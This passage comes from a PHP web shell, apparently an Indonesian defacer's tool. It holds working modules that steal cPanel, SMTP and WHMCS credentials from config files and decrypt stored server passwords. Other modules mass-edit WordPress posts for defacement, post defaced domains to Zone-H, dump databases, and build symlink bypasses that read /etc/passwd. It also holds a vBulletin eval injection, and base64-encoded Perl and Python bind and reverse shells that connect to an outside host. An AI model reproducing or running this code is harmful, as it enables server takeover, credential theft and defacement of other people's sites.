				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' value='Crack'>
		</form>
		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span></center>";
	}
}
elseif($_GET['do'] == 'smtp') {
    function scj($dir) {
        $dira = scandir($dir);
        foreach($dira as $dirb) {
            if(!is_file("$dir/$dirb")) continue;
            $ambil = file_get_contents("$dir/$dirb");
            $ambil = str_replace("$", "", $ambil);
            if(preg_match("/JConfig|joomla/", $ambil)) {
                $smtp_host = ambilkata($ambil,"smtphost = '","'");
                $smtp_auth = ambilkata($ambil,"smtpauth = '","'");
                $smtp_user = ambilkata($ambil,"smtpuser = '","'");
                $smtp_pass = ambilkata($ambil,"smtppass = '","'");
                $smtp_port = ambilkata($ambil,"smtpport = '","'");
                $smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
                echo "<center>";
                echo "SMTP Host: <font color=lime>$smtp_host</font><br>";
                echo "SMTP port: <font color=lime>$smtp_port</font><br>";
                echo "SMTP user: <font color=lime>$smtp_user</font><br>";
                echo "SMTP pass: <font color=lime>$smtp_pass</font><br>";
                echo "SMTP auth: <font color=lime>$smtp_auth</font><br>";
                echo "SMTP secure: <font color=lime>$smtp_secure</font><br><br>";
            }
        }
    }
    $smpt_hunter = scj($dir);
    echo $smpt_hunter;
    echo "<span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span></center>";
}
elseif($_GET['do'] == 'auto_wp') {
    if($_POST['hajar']) {
        $title = htmlspecialchars($_POST['new_title']);
        $pn_title = str_replace(" ", "-", $title);
        if($_POST['cek_edit'] == "Y") {
            $script = $_POST['edit_content'];
        } else {
            $script = $title;
        }
        $conf = $_POST['config_dir'];
        $scan_conf = scandir($conf);
        foreach($scan_conf as $file_conf) {
            if(!is_file("$conf/$file_conf")) continue;
            $config = file_get_contents("$conf/$file_conf");
            if(preg_match("/WordPress/", $config)) {
                $dbhost = ambilkata($config,"DB_HOST', '","'");
                $dbuser = ambilkata($config,"DB_USER', '","'");
                $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                $dbname = ambilkata($config,"DB_NAME', '","'");
                $dbprefix = ambilkata($config,"table_prefix  = '","'");
                $prefix = $dbprefix."posts";
                $option = $dbprefix."options";
                $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                $db = mysql_select_db($dbname);
                $q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
                $result = mysql_fetch_array($q);
                $id = $result[ID];
                $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                $result2 = mysql_fetch_array($q2);
                $target = $result2[option_value];
                $update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$script',post_name='$pn_title',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
                $update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
				echo "<div style='margin: 5px auto;'>";
                if($target == '') {
                    echo "URL: <font color=red>error, gabisa ambil nama domain nya</font> -> ";
                } else {
                    echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
                }
                if(!$update OR !$conn OR !$db) {
                    echo "<font color=red>MySQL Error: ".mysql_error()."</font><br>";
                } else {
                    echo "<font color=lime>sukses di ganti.</font><br>";
                }
                echo "</div>";
                mysql_close($conn);
            }
        }
    } else {
        echo "<center>
        <h3>Auto Edit Title+Content WordPress</h3>
        <form method='post'>
        DIR Config: <br>
        <input type='text' size='50' name='config_dir' value='$dir'><br><br>
        Set Title: <br>
        <input type='text' name='new_title' value='Visited By Mr.xBarakuda' placeholder='New Title'><br><br>
        Edit Content?: <input type='radio' name='cek_edit' value='Y' checked>Y<input type='radio' name='cek_edit' value='N'>N<br>
        <span>Jika pilih <u>Y</u> masukin script defacemu ( saran yang simple aja ), kalo pilih <u>N</u> gausah di isi.</span><br>
        <textarea name='edit_content' placeholder='contoh script: http://pastebin.com/EpP671gK' style='width: 450px; height: 150px;'></textarea><br>
        <input type='submit' name='hajar' value='Hajar!' style='width: 450px;'><br>
        </form>
        <span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
        ";
    }
}
elseif($_GET['do'] == 'zoneh') {
    if($_POST['submit']) {
        $domain = explode("\r\n", $_POST['url']);
        $nick =  $_POST['nick'];
        echo "Defacer Onhold: <a href='http://zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://zone-h.org/archive/notifier=$nick/published=0</a><br>";
        echo "Defacer Archive: <a href='http://zone-h.org/archive/notifier=$nick' target='_blank'>http://zone-h.org/archive/notifier=$nick</a><br><br>";
    function zoneh($url,$nick) {
    $ch = curl_init("http://zone-h.org/notify/single");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
    return curl_exec($ch);
    curl_close($ch);
    }
        foreach($domain as $url) {
            $zoneh = zoneh($url,$nick);
            if(preg_match("/color=\"red\">OK</font></li>/i", $zoneh)) {
                echo "$url -> <font color=lime>OK</font><br>";
            } else {
                echo "$url -> <font color=red>ERROR</font><br>";
            }
        }
    } else {
        echo "<center><h3>Zone-H Mass Poster</h3>
		<form method='post'>
        <u>Defacer</u>: <br>
        <input type='text' name='nick' size='50' value='Mr.xBarakuda'><br>
        <u>Domains</u>: <br>
        <textarea style='width: 450px; height: 150px;' name='url' placeholder='http://lusuka.co.li/'></textarea><br>
        <input type='submit' name='submit' value='Submit' style='width: 450px;'>
        </form>";
    }
    echo "</center>";
}
elseif(isset($_GET['do']) && ($_GET['do'] == 'whmcsdeco')) {
function decrypt ($string,$cc_encryption_hash) {
    $key = md5 (md5 ($cc_encryption_hash)) . md5 ($cc_encryption_hash);
    $hash_key = _hash ($key);
    $hash_length = strlen ($hash_key);
    $string = base64_decode ($string);
    $tmp_iv = substr ($string, 0, $hash_length);
    $string = substr ($string, $hash_length, strlen ($string) - $hash_length);
    $iv = $out = '';
    $c = 0;
    while ($c < $hash_length)
    {
        $iv .= chr (ord ($tmp_iv[$c]) ^ ord ($hash_key[$c]));
        ++$c;
    }
    $key = $iv;
    $c = 0;
    while ($c < strlen ($string))
    {
        if (($c != 0 AND $c % $hash_length == 0))
        {
            $key = _hash ($key . substr ($out, $c - $hash_length, $hash_length));
        }
        $out .= chr (ord ($key[$c % $hash_length]) ^ ord ($string[$c]));
        ++$c;
    }
    return $out;
}

function _hash ($string)
{
    if (function_exists ('sha1'))
    {
        $hash = sha1 ($string);
    }
    else
    {
        $hash = md5 ($string);
    }
    $out = '';
    $c = 0;
    while ($c < strlen ($hash))
    {
        $out .= chr (hexdec ($hash[$c] . $hash[$c + 1]));
        $c += 2;
    }
    return $out;
}

echo "
<center><h3>WHMCS Decoder</h3>
<form action=''  method='post'>
<input type='hidden' name='form_action' value='2'>
<br>
<table class='tabnet' style='width:320px;padding:0 1px;'>
<tr><td>db_host: </td><td><input type='text' class='inputz' size='38' name='db_host' value='localhost'></td></tr>
<tr><td>db_username: </td><td><input type='text' class='inputz' size='38' name='db_username' value=''></td></tr>
<tr><td>db_password: </td><td><input type='text' class='inputz' size='38' name='db_password' value=''></td></tr>
<tr><td>db_name: </td><td><input type='text' class='inputz' size='38' name='db_name' value=''></td></tr>
<tr><td>cc_encryption_hash: </td><td><input type='text' class='inputz' size='38' name='cc_encryption_hash' value=''></td></tr>
<td><input class='inputzbut' type='submit' value='Submit' name='Submit' align='center'></td>
</table></form></center>";

 if($_POST['form_action'] == 2 )
 {
 //include($file);
 $db_host=($_POST['db_host']);
 $db_username=($_POST['db_username']);
 $db_password=($_POST['db_password']);
 $db_name=($_POST['db_name']);
 $cc_encryption_hash=($_POST['cc_encryption_hash']);

$link=mysql_connect($db_host,$db_username,$db_password);
mysql_select_db($db_name,$link);
$query = mysql_query("SELECT * FROM tblservers");
while($v = mysql_fetch_array($query)) {
$ipaddress = $v['ipaddress'];
$username = $v['username'];
$type = $v['type'];
$active = $v['active'];
$hostname = $v['hostname'];
echo("<center><table border='1'>");
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td>Type</td><td>$type</td></tr>");
echo("<tr><td>Active</td><td>$active</td></tr>");
echo("<tr><td>Hostname</td><td>$hostname</td></tr>");
echo("<tr><td>Ip</td><td>$ipaddress</td></tr>");
echo("<tr><td>Username</td><td>$username</td></tr>");
echo("<tr><td>Password</td><td>$password</td></tr>");

echo "</table><br><br></center>";
}

$link=mysql_connect($db_host,$db_username,$db_password);
mysql_select_db($db_name,$link);
$query = mysql_query("SELECT * FROM tblregistrars");
echo("<center>Domain Reseller <br><table class=tabnet border='1'>");
echo("<tr><td>Registrar</td><td>Setting</td><td>Value</td></tr>");
while($v = mysql_fetch_array($query)) {
$registrar     = $v['registrar'];
$setting = $v['setting'];
$value = decrypt ($v['value'], $cc_encryption_hash);
if ($value=="") {
$value=0;
}
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td>$registrar</td><td>$setting</td><td>$value</td></tr>");
}
}
}
elseif($_GET['do'] == 'dbdump') {
echo $head.'<p align="center">';
echo '
<center><form action method=post>
<table width=365 class=tabnet >
<tr><th colspan="2"><h3>Database Dump</h3></th></tr>
<tr>
	<td>Server </td>
	<td><input class="inputz" type=text name=server size=52></td></tr><tr>
	<td>Username</td>
	<td><input class="inputz" type=text name=username size=52></td></tr><tr>
	<td>Password</td>
	<td><input class="inputz" type=text name=password size=52></td></tr><tr>
	<td>DataBase Name</td>
	<td><input class="inputz" type=text name=dbname size=52></td></tr>
	<tr>
	<td>DB Type </td>
	<td><form method=post action="'.$me.'">
	<select class="inputz" name=method>
		<option  value="gzip">Gzip</option>
		<option value="sql">Sql</option>
		</select>
	<input class="inputzbut" type=submit value="  Dump!  " ></td></tr>
	</form></center></table></center>';
if ($_POST['username'] && $_POST['dbname'] && $_POST['method']){
$date = date("Y-m-d");
$dbserver = $_POST['server'];
$dbuser = $_POST['username'];
$dbpass = $_POST['password'];
$dbname = $_POST['dbname'];
$file = "Dump-$dbname-$date";
$method = $_POST['method'];
if ($method=='sql'){
$file="Dump-$dbname-$date.sql";
$fp=fopen($file,"w");
}else{
$file="Dump-$dbname-$date.sql.gz";
$fp = gzopen($file,"w");
}
function write($data) {
global $fp;
if ($_POST['method']=='ssql'){
fwrite($fp,$data);
}else{
gzwrite($fp, $data);
}}
mysql_connect ($dbserver, $dbuser, $dbpass);
mysql_select_db($dbname);
$tables = mysql_query ("SHOW TABLES");
while ($i = mysql_fetch_array($tables)) {
    $i = $i['Tables_in_'.$dbname];
    $create = mysql_fetch_array(mysql_query ("SHOW CREATE TABLE ".$i));
    write($create['Create Table'].";");
    $sql = mysql_query ("SELECT * FROM ".$i);
    if (mysql_num_rows($sql)) {
        while ($row = mysql_fetch_row($sql)) {
            foreach ($row as $j => $k) {
                $row[$j] = "'".mysql_escape_string($k)."'";
            }
            write("INSERT INTO $i VALUES(".implode(",", $row).");\n");
        }
    }
}
if ($method=='ssql'){
fclose ($fp);
}else{
gzclose($fp);}
header("Content-Disposition: attachment; filename=" . $file);   
header("Content-Type: application/download");
header("Content-Length: " . filesize($file));
flush();

$fp = fopen($file, "r");
while (!feof($fp))
{
    echo fread($fp, 65536);
    flush();
} 
fclose($fp); 
}
}
elseif($_GET['do'] == 'symlink') {
$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
$d0mains = @file("/etc/named.conf");
##httaces
if($d0mains){
@mkdir("kuda_sym",0777);
@chdir("kuda_sym");
@exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex kuda.html
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);@fclose($fp3);
echo "
<table align=center border=1 style='width:70%;border-color:#333333;'>
<tr>
<td align=center>-<font size=3>-S. No.-</font></td>
<td align=center>-<font size=3>-Domains-</font></td>
<td align=center>-<font size=3>-Users-</font></td>
<td align=center>-<font size=3>-Symlink-</font></td>
</tr>";
$dcount = 1;
foreach($d0mains as $d0main){
if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
<td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
<td>".$user['name']."</td>
<td><a href='$full/kuda_sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>";
flush();
$dcount++;}}}
echo "</table>";
}else{
$TEST=@file('/etc/passwd');
if ($TEST){
@mkdir("kuda_sym",0777);
@chdir("kuda_sym");
exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex kuda.html
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);
 @fclose($fp3);
 echo "
 <table align=center border=1><tr>
 <td align=center><font size=3>-S. No.-</font></td>
 <td align=center><font size=3>-Users-</font></td>
 <td align=center><font size=3>-Symlink-</font></td></tr>";
 $dcount = 1;
 $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
 while(!feof($file)){
 $s = fgets($file);
 $matches = array();
 $t = preg_match('//(.*?)://s', $s, $matches);
 $matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/kuda_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("kuda_sym",0777);@chdir("kuda_sym");@exe("ln -s / root");$file3 = '
Options Indexes FollowSymLinks
DirectoryIndex kuda.html
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any
';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);@fclose($fp3);
 echo "
 <table align=center border=1><tr>
 <td align=center><font size=3>ID</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $temp = "";$val1 = 0;$val2 = 1000;
 for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
 if ($uid)$temp .= join(':',$uid)."n";}
 echo '<br/>';$temp = trim($temp);$file5 =
 fopen("test.txt","w");
 fputs($file5,$temp);
 fclose($file5);$dcount = 1;$file =
 fopen("test.txt", "r") or exit("Unable to open file!");
 while(!feof($file)){$s = fgets($file);$matches = array();
 $t = preg_match('//(.*?)://s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/kuda_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}
 fclose($file);
 echo "</table></div></center>";unlink("test.txt");
 } else
 echo "<center><font size=3>Cannot create Symlink</font></center>";
 }
 }
}
elseif($_GET['do'] == 'sympy') {
	$sym_dir = mkdir('kuda_sympy', 0755);
    chdir('kuda_sympy');
	$file_sym = "sym.py";
	$sym_script = "Iy8qUHl0aG9uDQoNCmltcG9ydCB0aW1lDQppbXBvcnQgb3MNCmltcG9ydCBzeXMNCmltcG9ydCByZQ0KDQpvcy5zeXN0ZW0oImNvbG9yIEMiKQ0KDQpodGEgPSAiXG5GaWxlIDogLmh0YWNjZXNzIC8vIENyZWF0ZWQgU3VjY2Vzc2Z1bGx5IVxuIg0KZiA9ICJBbGwgUHJvY2Vzc2VzIERvbmUhXG5TeW1saW5rIEJ5cGFzc2VkIFN1Y2Nlc3NmdWxseSFcbiINCnByaW50ICJcbiINCnByaW50ICJ+Iio2MA0KcHJpbnQgIlN5bWxpbmsgQnlwYXNzIDIwMTQgYnkgTWluZGxlc3MgSW5qZWN0b3IgIg0KcHJpbnQgIlNwZWNpYWwgR3JlZXR6IHRvIDogUGFrIEN5YmVyIFNrdWxseiINCnByaW50ICJ+Iio2MA0KDQpvcy5tYWtlZGlycygna3VkYXN5bXB5JykNCm9zLmNoZGlyKCdrdWRhc3ltcHknKQ0KDQpzdXNyPVtdDQpzaXRleD1bXQ0Kb3Muc3lzdGVtKCJsbiAtcyAvIGt1ZGEudHh0IikNCg0KaCA9ICJPcHRpb25zIEluZGV4ZXMgRm9sbG93U3ltTGlua3NcbkRpcmVjdG9yeUluZGV4IGt1ZGEucGh0bWxcbkFkZFR5cGUgdHh0IC5waHBcbkFkZEhhbmRsZXIgdHh0IC5waHAiDQptID0gb3BlbigiLmh0YWNjZXNzIiwidysiKQ0KbS53cml0ZShoKQ0KbS5jbG9zZSgpDQpwcmludCBodGENCg0Kc2YgPSAiPGh0bWw+PHRpdGxlPlN5bWxpbmsgUHl0aG9uPC90aXRsZT48Y2VudGVyPjxmb250IGNvbG9yPXdoaXRlIHNpemU9NT5TeW1saW5rIEJ5cGFzcyAyMDE3PGJyPjxmb250IHNpemU9ND5NYWRlIEJ5IE1pbmRsZXNzIEluamVjdG9yIDxicj5SZWNvZGVkIEJ5IE1yLnhCYXJha3VkYTwvZm9udD48L2ZvbnQ+PGJyPjxmb250IGNvbG9yPXdoaXRlIHNpemU9Mz48dGFibGU+Ig0KDQpvID0gb3BlbignL2V0Yy9wYXNzd2QnLCdyJykNCm89by5yZWFkKCkNCm8gPSByZS5maW5kYWxsKCcvaG9tZS9cdysnLG8pDQoNCmZvciB4dXNyIGluIG86DQoJeHVzcj14dXNyLnJlcGxhY2UoJy9ob21lLycsJycpDQoJc3Vzci5hcHBlbmQoeHVzcikNCnByaW50ICItIiozMA0KeHNpdGUgPSBvcy5saXN0ZGlyKCIvdmFyL25hbWVkIikNCg0KZm9yIHh4c2l0ZSBpbiB4c2l0ZToNCgl4eHNpdGU9eHhzaXRlLnJlcGxhY2UoIi5kYiIsIiIpDQoJc2l0ZXguYXBwZW5kKHh4c2l0ZSkNCnByaW50IGYNCnBhdGg9b3MuZ2V0Y3dkKCkNCmlmICIvcHVibGljX2h0bWwvIiBpbiBwYXRoOg0KCXBhdGg9Ii9wdWJsaWNfaHRtbC8iDQplbHNlOg0KCXBhdGggPSAiL2h0bWwvIg0KY291bnRlcj0xDQppcHM9b3Blbigia3VkYS5waHRtbCIsInciKQ0KaXBzLndyaXRlKHNmKQ0KDQpmb3IgZnVzciBpbiBzdXNyOg0KCWZvciBmc2l0ZSBpbiBzaXRleDoNCgkJZnU9ZnVzclswOjVdDQoJCXM9ZnNpdGVbMDo1XQ0KCQlpZiBmdT09czoNCgkJCWlwcy53cml0ZSgiPGJvZHkgYmdjb2xvcj1ibGFjaz48dHI+PHRkIHN0eWxlPWZvbnQtZmFtaWx5OmNhbGlicmk7Zm9udC13ZWlnaHQ6Ym9sZDtjb2xvcjp3aGl0ZTs+JXM8L3RkPjx0ZCBzdHlsZT1mb250LWZhbWlseTpjYWxpYnJpO2ZvbnQtd2VpZ2h0OmJvbGQ7Y29sb3I6cmVkOz4lczwvdGQ+PHRkIHN0eWxlPWZvbnQtZmFtaWx5OmNhbGlicmk7Zm9udC13ZWlnaHQ6Ym9sZDs+PGEgaHJlZj1rdWRhLnR4dC9ob21lLyVzJXMgdGFyZ2V0PV9ibGFuayA+JXM8L2E+PC90ZD4iJShjb3VudGVyLGZ1c3IsZnVzcixwYXRoLGZzaXRlKSkNCgkJCWNvdW50ZXI9Y291bnRlcisx";
        $sym = fopen($file_sym, "w");
	fwrite($sym, base64_decode($sym_script));
	chmod($file_sym, 0755);
        $kuda = exe("python sym.py");
	echo "<center><a href='kuda_sympy/kudasympy/' target='_blank'><font color='lime'>Clik Here</a></font></center>";
}
elseif($_GET['do'] == 'vb_ngindex') {
	{
?>
<form action="" method="post">
<center><h3>VB Index Changer</h3></center>
<?php
if(empty($_POST['index'])) {
echo "<center><form method='post'><table>
<tr><td>Host: </td><td><input class='inputz' type='text' size='52' name='localhost' placeholder='localhost'></td></tr><br>
<tr><td>Database: </td><td><input class='inputz' type='text' size='52' name='database' placeholder='forum_vb'></td></tr><br>
<tr><td>Username: </td><td><input class='inputz' type='text' size='52' name='username' placeholder='user_vb'></td></tr><br>
<tr><td>Password: </td><td><input class='inputz' type='text' size='52' name='password' placeholder='vb'></td></tr></table><br>
<th colspan='2'>Your Index Code</th><br>
<textarea name='index' rows='13' style='width: 450px; height: 200px;' border='1' cols='69' name='code'>Your Index Code Here...</textarea><br>
<input class='inputzbut' type='submit' value='Setting!' name='send'>
</form></center></table>";
    }else{
    $localhost = $_POST['localhost'];
    $database = $_POST['database'];
    $username = $_POST['username'];
    $password = $_POST['password'];
    $index = $_POST['index'];
    @mysql_connect($localhost,$username,$password) or die(mysql_error());
    @mysql_select_db($database) or die(mysql_error());
    $index=str_replace("'","'",$index);
    $set_index = "{${eval(base64_decode('";
    $set_index .= base64_encode("echo "$index";");
    $set_index .= "'))}}{${exit()}}</textarea>";
    echo("SET template ='".$set_index."' ") ;
    $ok=@mysql_query("SET template ='".$set_index."'") or die(mysql_error());
    if($ok){
    echo "<center>Update success...</center>";
    } 
  }
}
}
elseif($_GET['do'] == 'bctools'){
      echo "<center><h3>Back Connect Tools</h3>";
      echo "<form method='post'>
      <span>Bind port to /bin/sh [Perl]</font></span><br/>
      Port: <input type='text' name='port' value='666'> <input type='submit' name='bpl' value='>>'>
      <br><br>
      <span>Back-Connect</span><br/>
      Server: <input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'> Port: <input type='text' name='port' value='666'><select class='select' name='backconnect'  style='width: 100px;' height='10'><option value='perl'>Perl</option><option value='php'>PHP</option><option value='python'>Python</option><option value='ruby'>Ruby</option></select> <input type=submit value='>>'>";
      echo "</form>";
      echo "</center>";
        if($_POST['bpl']) {
        $bp=base64_decode("IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=");
        $brt=@fopen('bp.pl','w');
      fwrite($brt,$bp);
      $out = exe("perl bp.pl ".$_POST['port']." 1>/dev/null 2>&1 &");
      sleep(1);
      echo "<center><pre>$out\n".exe("ps aux | grep bp.pl")."</pre></center>";
      unlink("bp.pl");
          }
          if($_POST['backconnect'] == 'perl') {
      $bc=base64_decode("IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7");
      $plbc=@fopen('bc.pl','w');
      fwrite($plbc,$bc);
      $out = exe("perl bc.pl ".$_POST['server']." ".$_POST['port']." 1>/dev/null 2>&1 &");
      sleep(1);
      echo "<center><pre>$out\n".exe("ps aux | grep bc.pl")."</pre></center>";
      unlink("bc.pl");
      }
      if($_POST['backconnect'] == 'python') {
      $becaa=base64_decode("IyEvdXNyL2Jpbi9weXRob24NCiNVc2FnZTogcHl0aG9uIGZpbGVuYW1lLnB5IEhPU1QgUE9SVA0KaW1wb3J0IHN5cywgc29ja2V0LCBvcywgc3VicHJvY2Vzcw0KaXBsbyA9IHN5cy5hcmd2WzFdDQpwb3J0bG8gPSBpbnQoc3lzLmFyZ3ZbMl0pDQpzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoNjApDQpkZWYgcHliYWNrY29ubmVjdCgpOg0KICB0cnk6DQogICAgam1iID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pDQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkNCiAgICBqbWIuc2VuZCgnJydcblB5dGhvbiBCYWNrQ29ubmVjdCBCeSBNci54QmFyYWt1ZGFcblRoYW5rcyBHb29nbGUgRm9yIFJlZmVyZW5zaVxuXG4nJycpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMCkNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwxKQ0KICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDIpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMykNCiAgICBzaGVsbCA9IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKQ0KICBleGNlcHQgc29ja2V0LnRpbWVvdXQ6DQogICAgcHJpbnQgIlRpbU91dCINCiAgZXhjZXB0IHNvY2tldC5lcnJvciwgZToNCiAgICBwcmludCAiRXJyb3IiLCBlDQpweWJhY2tjb25uZWN0KCk=");
      $pbcaa=@fopen('bcpyt.py','w');
      fwrite($pbcaa,$becaa);
      $out1 = exe("python bcpyt.py ".$_POST['server']." ".$_POST['port']);
      sleep(1);
      echo "<center><pre>$out1\n".exe("ps aux | grep bcpyt.py")."</pre></center>";
      unlink("bcpyt.py");
      }
      if($_POST['backconnect'] == 'ruby') {
